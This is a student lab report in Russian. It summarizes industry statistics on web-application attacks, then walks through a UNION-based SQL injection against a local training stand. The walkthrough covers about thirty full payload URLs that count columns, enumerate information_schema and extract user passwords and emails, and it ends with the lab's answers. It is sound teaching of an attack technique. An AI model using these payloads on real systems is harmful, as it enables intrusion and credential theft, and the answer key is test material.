# ЛР 2. Симуляция атаки по уязвимости OWASP Top 10 - Web

## Часть I. Статистика атак через веб-уязвимости

### Источники

1. Positive Technologies, "Итоги проектов по расследованию инцидентов и ретроспективному анализу - 2024-2025"
  [https://ptsecurity.com/research/analytics/results-of-incident-investigation-and-retrospective-analysis-projects-2024-2025/](https://ptsecurity.com/research/analytics/results-of-incident-investigation-and-retrospective-analysis-projects-2024-2025/)
2. Positive Technologies, "Как изменились атаки на российские компании за два года"
  [https://www.ptsecurity.com/ru-ru/research/analytics/kak-izmenilis-ataki-na-rossiyskie-kompanii-za-dva-goda](https://www.ptsecurity.com/ru-ru/research/analytics/kak-izmenilis-ataki-na-rossiyskie-kompanii-za-dva-goda)
3. Verizon, "2024 Data Breach Investigations Report"
  [https://www.verizon.com/business/resources/reports/2024-dbir-data-breach-investigations-report.pdf](https://www.verizon.com/business/resources/reports/2024-dbir-data-breach-investigations-report.pdf)
4. Verizon DBIR 2024, "Basic Web Application Attacks"
  [https://verizon.com/business/en-gb/resources/reports/dbir/2024/incident-classification-patterns-intro/basic-web-application-attacks](https://verizon.com/business/en-gb/resources/reports/dbir/2024/incident-classification-patterns-intro/basic-web-application-attacks)
5. Edgescan, "2024 Vulnerability Statistics Report"
  [https://www.edgescan.com/wp-content/uploads/2025/04/2024-Vulnerability-Statistics-Report.pdf](https://www.edgescan.com/wp-content/uploads/2025/04/2024-Vulnerability-Statistics-Report.pdf)
6. BreachLock, "2024 Penetration Testing Intelligence Report"
  [https://www.breachlock.com/resources/reports/2024-breachlock-penetration-testing-intelligence-report/](https://www.breachlock.com/resources/reports/2024-breachlock-penetration-testing-intelligence-report/)
7. Akamai, "State of the Internet 2024: Securing Apps"
  [https://www.akamai.com/site/en/documents/state-of-the-internet/2024/securing-apps-report.pdf](https://www.akamai.com/site/en/documents/state-of-the-internet/2024/securing-apps-report.pdf)
8. OWASP Top 10:2021
  [https://owasp.org/Top10/2021/A00_2021_Introduction/](https://owasp.org/Top10/2021/A00_2021_Introduction/)

### Доля успешных атак через веб-уязвимости

1. По данным Positive Technologies за период IV квартал 2024 - III квартал 2025, в 36% расследованных инцидентов исходной точкой проникновения были бизнес-приложения на сетевом периметре, то есть доступные из интернета приложения. В отчете этот способ описан как самый распространенный вариант первоначального проникновения.
2. В другом материале Positive Technologies по российским организациям указано, что по результатам расследований 2023-2024 годов самой частой точкой входа были уязвимые веб-приложения на периметре - 44% расследований. Еще в 13% использовались другие внешние сервисы, например VPN, RDP и SSH. В этом же материале сказано, что по итогам трех кварталов 2024 года эксплуатация уязвимостей приложений и сервисов внешнего периметра встречалась почти в каждой четвертой успешной атаке, то есть в 23% случаев.
3. По данным Verizon DBIR 2024, эксплуатация уязвимостей как способ первоначального доступа составила 14% всех подтвержденных утечек и выросла почти в 3 раза относительно предыдущего года. В отчете отдельно отмечено, что основным вектором для таких начальных точек входа были веб-приложения.
4. В разделе Verizon DBIR 2024 "Basic Web Application Attacks" указано, что базовые атаки на веб-приложения составили чуть более 8% подтвержденных утечек. Внутри этой категории 77% были связаны с использованием украденных учетных данных, 21% - с brute force, 13% - с эксплуатацией уязвимости.
5. Akamai показывает не долю успешных атак, а интенсивность наблюдаемых атак на приложения и API. По их данным, количество атак на веб-приложения и API выросло на 49% с Q1 2023 по Q1 2024, а среди устойчиво популярных векторов названы LFI, XSS, SQL injection, command injection и SSRF.

**Вывод по доле:** если рассматривать именно успешные расследованные инциденты в российских организациях, доля атак, начинающихся с веб-приложений на периметре, находится примерно в диапазоне 36-44% по данным Positive Technologies. Если брать более широкий международный срез DBIR по подтвержденным утечкам, то отдельная категория "Basic Web Application Attacks" занимает чуть более 8%, а эксплуатация уязвимостей как способ начального доступа - 14%, при этом основным вектором для таких уязвимостей названы веб-приложения.

### Распределение по конкретным веб-уязвимостям

1. Edgescan 2024, распределение high/critical web application vulnerabilities:
  - SQL Injection: 19.47%
  - Stored XSS: 10.50%
  - Malicious File Upload: 7.25%
  - Reflected XSS: 5.53%
  - Brute Forcing Weakness: 4.20%
  - File Path Traversal: 2.67%
  - Sensitive Files Disclosure: 2.67%
  - User Enumeration: 2.29%
  - CSRF: 2.10%
  - Authorization Issue / Privileges Bypass: 1.91%
2. Edgescan также отдельно отмечает, что SQL Injection (CWE-89) остается самой распространенной критической веб-уязвимостью. Это важно для данной лабораторной работы, потому что практическая часть как раз посвящена SQL-инъекции.
3. BreachLock 2024 по результатам более 4000 пентестов указывает, что среди веб-приложений самой частой high-уязвимостью был XSS - 25% high findings. Среди critical findings первое место занимают injection-атаки, а arbitrary file upload назван третьей по частоте critical-уязвимостью с долей 11%.
4. OWASP Top 10:2021 показывает распределение не по успешным атакам, а по классам риска в протестированных приложениях. В официальном описании указано:
  - Broken Access Control: средняя incidence rate 3.81%, категория с наибольшим числом occurrences в наборе данных OWASP;
  - Injection: средняя incidence rate 3.37%, максимальная incidence rate 19%, в категорию включены SQL Injection и XSS;
  - Security Misconfiguration: 90% приложений тестировались на этот класс проблем, категория поднялась в рейтинге относительно OWASP Top 10 2017.
5. Akamai не приводит процентное распределение по всем типам уязвимостей, но фиксирует рост отдельных векторов: LFI вырос на 120% с Q1 2023 по Q1 2024, SQLi и CMDi выросли на 25%. Это подтверждает, что инъекции и ошибки обработки пользовательского ввода остаются актуальными.

### Общий вывод

Веб-приложения остаются одной из основных точек входа в инфраструктуру организаций. В российских расследованиях Positive Technologies доля атак через уязвимые веб-приложения на периметре достигает 36-44% в зависимости от периода и методики подсчета. В международной статистике Verizon DBIR 2024 категория базовых атак на веб-приложения занимает чуть более 8% подтвержденных утечек, но эксплуатация уязвимостей как начальный доступ выросла до 14%, а основным вектором для таких случаев названы веб-приложения. Среди конкретных веб-уязвимостей по отчетам Edgescan и BreachLock особенно выделяются SQL Injection, XSS, file upload, path traversal, CSRF и проблемы авторизации.

## Часть 2

### Ход рассуждений

На странице задания было написано, что надо передать свой id. Поэтому я начал с самого обычного запроса, без атаки, чтобы просто понять как страница в целом отвечает. Потом уже стал менять параметр id и смотреть где поведение отличается

Сначала я проверил, ломается ли запрос от кавычки. Это базовая проверка для SQL-инъекции, потому что если параметр вставляется в SQL как строка, лишняя кавычка часто ломает синтаксис. Потом пробовал обычные условия OR и AND, но без закрытия кавычки они не дали результата. После этого стало понятно, что надо закрывать строку через одинарную кавычку и дальше уже дописывать свою часть SQL

Дальше я определял количество колонок. Для UNION это важно, потому что если в оригинальном SELECT три поля, то и в UNION SELECT тоже надо дать три поля. Иначе MySQL сразу ругается на разное число колонок. Когда стало понятно, что колонок три, я начал выводить во вторую колонку служебную информацию - имя базы, таблицы, потом колонки. Потом уже забрал нужные данные из таблиц users и emails

### Запросы и мысли 

1. [http://localhost:8080/task/?id=1](http://localhost:8080/task/?id=1)
  Сначала я просто отправил нормальный id без всяких попыток атаки. Страница ответила: "Ваш id:1", "Ваш логин:admin". Значит параметр id реально используется и через него можно смотреть пользователей.
2. [http://localhost:8080/task/?id=1%27](http://localhost:8080/task/?id=1%27)
  Потом добавил одинарную кавычку. Я сделал это потому что часто SQL запрос выглядит примерно как `WHERE id='1'`, и лишняя кавычка ломает строку. Тут появилась SQL-ошибка около "'1'' LIMIT 0,1", значит ввод попадает в запрос почти напрямую
3. [http://localhost:8080/task/?id=1%20OR%201%3D1](http://localhost:8080/task/?id=1%20OR%201%3D1)
  Дальше попробовал простой вариант `OR 1=1`, чтобы условие стало всегда верным. Но снова вернулся admin, то есть ничего особо не поменялось. Похоже, я не закрыл кавычку и поэтому этот кусок не сработал как надо
4. [http://localhost:8080/task/?id=1%20AND%201%3D2](http://localhost:8080/task/?id=1%20AND%201%3D2)
  Тут я проверил обратное условие `AND 1=2`, оно всегда ложное. Если бы оно нормально встроилось в запрос, запись должна была пропасть. Но admin снова вернулся, значит без закрытия кавычки такие проверки не работают.
5. [http://localhost:8080/task/?id=1%20ORDER%20BY%201](http://localhost:8080/task/?id=1%20ORDER%20BY%201)
  Я начал пробовать `ORDER BY`, чтобы узнать сколько колонок в исходном запросе. С `ORDER BY 1` страница снова вернула admin. Пока это ничего не доказывает, потому что кавычку я еще не закрывал.
6. [http://localhost:8080/task/?id=1%20ORDER%20BY%202](http://localhost:8080/task/?id=1%20ORDER%20BY%202)
  Проверил `ORDER BY 2`. Ответ такой же, admin. Если бы запрос встроился правильно и второй колонки не было, была бы ошибка, но пока это все еще не очень полезная проверка.
7. [http://localhost:8080/task/?id=1%20ORDER%20BY%203](http://localhost:8080/task/?id=1%20ORDER%20BY%203)
  Потом проверил `ORDER BY 3`. Снова обычный ответ с admin. Я начал понимать, что проблема не в самом `ORDER BY`, а в том что надо закрывать строку кавычкой.
8. [http://localhost:8080/task/?id=1%20ORDER%20BY%204](http://localhost:8080/task/?id=1%20ORDER%20BY%204)
  Даже `ORDER BY 4` вернул admin. Обычно если колонок меньше четырех, должна быть ошибка. Значит эти первые попытки с `ORDER BY` были неудачные, потому что SQL не был дописан в нужное место.
9. [http://localhost:8080/task/?id=1%27%20OR%20%271%27%3D%271](http://localhost:8080/task/?id=1%27%20OR%20%271%27%3D%271)
  Теперь я закрыл строку через `1'` и добавил `OR '1'='1'`. Это условие всегда true. Запись вернулась, и стало понятно, что теперь моя часть SQL уже реально выполняется.
10. [http://localhost:8080/task/?id=1%27%20AND%20%271%27%3D%272](http://localhost:8080/task/?id=1%27%20AND%20%271%27%3D%272)
  Потом сделал ложное условие `AND '1'='2'`. Запись не вернулась. Это уже хорошее подтверждение, что я управляю условием в SQL-запросе.
11. [http://localhost:8080/task/?id=1%27%20OR%20%271%27%3D%271%27%20--%20](http://localhost:8080/task/?id=1%27%20OR%20%271%27%3D%271%27%20--%20)
  Тут я добавил `--` в конце, чтобы закомментировать остаток исходного запроса. Admin вернулся. Такой вариант удобнее, потому что хвост запроса уже не мешает.
12. [http://localhost:8080/task/?id=1%27%20AND%20%271%27%3D%272%27%20--%20](http://localhost:8080/task/?id=1%27%20AND%20%271%27%3D%272%27%20--%20)
  Снова проверил ложное условие, но уже с комментарием в конце. Запись не вернулась. Значит конструкция с кавычкой и `--` подходит для следующих шагов.
13. [http://localhost:8080/task/?id=1%27%20ORDER%20BY%201%20--%20](http://localhost:8080/task/?id=1%27%20ORDER%20BY%201%20--%20)
  Теперь `ORDER BY 1` сработал нормально, ошибки нет. Значит в исходном `SELECT` точно есть первая колонка.
14. [http://localhost:8080/task/?id=1%27%20ORDER%20BY%202%20--%20](http://localhost:8080/task/?id=1%27%20ORDER%20BY%202%20--%20)
  Проверил вторую колонку. Ошибки тоже нет, значит колонок минимум две.
15. [http://localhost:8080/task/?id=1%27%20ORDER%20BY%203%20--%20](http://localhost:8080/task/?id=1%27%20ORDER%20BY%203%20--%20)
  Проверил третью колонку. Ошибки нет, значит колонок минимум три.
16. [http://localhost:8080/task/?id=1%27%20ORDER%20BY%204%20--%20](http://localhost:8080/task/?id=1%27%20ORDER%20BY%204%20--%20)
  На `ORDER BY 4` появилась ошибка "Unknown column '4' in 'order clause'". Значит четвертой колонки нет, а всего в исходном запросе три колонки.
17. [http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%201%20--%20](http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%201%20--%20)
  Перешел к `UNION SELECT`. Поставил `id=-1`, чтобы обычный пользователь не нашелся и выводился мой `UNION`. С одной колонкой MySQL дал ошибку про разное число колонок.
18. [http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%201%2C2%20--%20](http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%201%2C2%20--%20)
  Попробовал две колонки. Ошибка осталась, значит двух колонок тоже мало.
19. [http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%201%2C2%2C3%20--%20](http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%201%2C2%2C3%20--%20)
  С тремя колонками запрос сработал. На странице появилось "Ваш id:1" и "Ваш логин:2". Значит `UNION SELECT` подходит, а на странице видны первая и вторая колонки.
20. [http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%201%2C2%2C3%2C4%20--%20](http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%201%2C2%2C3%2C4%20--%20)
  Для проверки попробовал четыре колонки. Снова ошибка про разное число колонок. Значит дальше надо всегда писать ровно три значения в `UNION SELECT`.
21. [http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%201%2Cdatabase%28%29%2C3%20--%20](http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%201%2Cdatabase%28%29%2C3%20--%20)
  Теперь я начал выводить полезные данные во вторую колонку, потому что она показывается как логин. `database()` вернул `security`, это имя текущей базы.
22. [http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%201%2Cversion%28%29%2C3%20--%20](http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%201%2Cversion%28%29%2C3%20--%20)
  Проверил версию базы. Страница показала `5.7.44`, значит это MySQL. Это полезно, потому что дальше можно использовать `information_schema`.
23. [http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%201%2Cgroup_concat%28table_name%29%2C3%20FROM%20information_schema.tables%20WHERE%20table_schema%3Ddatabase%28%29%20--%20](http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%201%2Cgroup_concat%28table_name%29%2C3%20FROM%20information_schema.tables%20WHERE%20table_schema%3Ddatabase%28%29%20--%20)
  Вывел таблицы из текущей базы. Получилось `emails,users`. По названиям уже понятно, что пользователи должны быть в `users`, а почты в `emails`.
24. [http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%201%2Cgroup_concat%28table_name%2C%27%3A%27%2Ccolumn_name%29%2C3%20FROM%20information_schema.columns%20WHERE%20table_schema%3Ddatabase%28%29%20--%20](http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%201%2Cgroup_concat%28table_name%2C%27%3A%27%2Ccolumn_name%29%2C3%20FROM%20information_schema.columns%20WHERE%20table_schema%3Ddatabase%28%29%20--%20)
  Потом вывел колонки таблиц. Страница показала `emails:id`, `emails:email_id`, `users:id`, `users:username`, `users:password`. Теперь уже понятно, откуда брать пароль и email.
25. [http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%201%2Cgroup_concat%28id%2C%27%3A%27%2Cusername%2C%27%3A%27%2Cpassword%20SEPARATOR%20%27%3B%20%27%29%2C3%20FROM%20users%20--%20](http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%201%2Cgroup_concat%28id%2C%27%3A%27%2Cusername%2C%27%3A%27%2Cpassword%20SEPARATOR%20%27%3B%20%27%29%2C3%20FROM%20users%20--%20)
  Сначала вывел всех пользователей с паролями, чтобы быстро найти нужный ник. В списке был `9:Volk2:Wa spoiuuuuu`, поэтому пароль Volk2 уже стал виден.
26. [http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%201%2Cpassword%2C3%20FROM%20users%20WHERE%20username%3D%27Volk2%27%20--%20](http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%201%2Cpassword%2C3%20FROM%20users%20WHERE%20username%3D%27Volk2%27%20--%20)
  Потом сделал отдельный запрос только для `Volk2`, чтобы ответ был без лишнего списка. Сервер вернул пароль `Wa spoiuuuuu`.
27. [http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%201%2Cgroup_concat%28id%2C%27%3A%27%2Cemail_id%20SEPARATOR%20%27%3B%20%27%29%2C3%20FROM%20emails%20--%20](http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%201%2Cgroup_concat%28id%2C%27%3A%27%2Cemail_id%20SEPARATOR%20%27%3B%20%27%29%2C3%20FROM%20emails%20--%20)
  Для второго задания вывел список почт с id. Там был id 4 и почта `honey_lover@otus-lab.com`, но еще надо было убедиться, что это именно `Vinni-pukh`.
28. [http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%201%2Cemail_id%2C3%20FROM%20emails%20WHERE%20id%3D%28SELECT%20id%20FROM%20users%20WHERE%20username%3D%27Vinni-pukh%27%29%20--%20](http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%201%2Cemail_id%2C3%20FROM%20emails%20WHERE%20id%3D%28SELECT%20id%20FROM%20users%20WHERE%20username%3D%27Vinni-pukh%27%29%20--%20)
  Здесь я сначала внутри запроса нашел id пользователя `Vinni-pukh`, а потом по этому id достал почту из `emails`. Получился email `honey_lover@otus-lab.com`.
29. [http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%201%2Cgroup_concat%28users.username%2C%27%3A%27%2Cemails.email_id%20SEPARATOR%20%27%3B%20%27%29%2C3%20FROM%20users%20JOIN%20emails%20ON%20users.id%3Demails.id%20--%20](http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%201%2Cgroup_concat%28users.username%2C%27%3A%27%2Cemails.email_id%20SEPARATOR%20%27%3B%20%27%29%2C3%20FROM%20users%20JOIN%20emails%20ON%20users.id%3Demails.id%20--%20)
  Еще проверил через `JOIN`, где сразу видно пары логин-почта. В выводе была пара `Vinni-pukh:honey_lover@otus-lab.com`, то есть почта совпала.
30. [http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%201%2Cemails.email_id%2C3%20FROM%20users%20JOIN%20emails%20ON%20users.id%3Demails.id%20WHERE%20users.username%3D%27Vinni-pukh%27%20--%20](http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%201%2Cemails.email_id%2C3%20FROM%20users%20JOIN%20emails%20ON%20users.id%3Demails.id%20WHERE%20users.username%3D%27Vinni-pukh%27%20--%20)
  Последним запросом вывел только почту нужного пользователя через `JOIN`. Сервер вернул `honey_lover@otus-lab.com`, это финальный ответ по второму заданию.

### Ответы

1. Пароль пользователя `Volk2`: `Wa spoiuuuuu`
2. Почта пользователя `Vinni-pukh`: `honey_lover@otus-lab.com`

### Скриншоты для подтверждения

Скриншоты сняты с того же SQLi-стенда. У меня порт `8080` в этот момент был занят другим контейнером, поэтому для скринов я поднял этот же стенд на `8081`.

1. Обычный запрос `id=1`.

![Обычный запрос id=1](screenshots/lr2_01_normal_id_admin.png)

2. Проверка одинарной кавычкой, появляется SQL-ошибка.

![Ошибка от кавычки](screenshots/lr2_02_quote_sql_error.png)

3. Проверка ложного условия, запись не возвращается.

![Ложное условие](screenshots/lr2_03_false_condition_empty.png)

4. `ORDER BY 4`, ошибка показывает что четвертой колонки нет.

![ORDER BY 4](screenshots/lr2_04_order_by_4_error.png)

5. `UNION SELECT` с тремя колонками, запрос уже работает.

![UNION SELECT](screenshots/lr2_05_union_three_columns.png)

6. Вывод таблиц и колонок через `information_schema`.

![Таблицы и колонки](screenshots/lr2_06_tables_columns.png)

7. Финальный запрос для почты `Vinni-pukh`.

![Финальный email](screenshots/lr2_07_final_email_join.png)
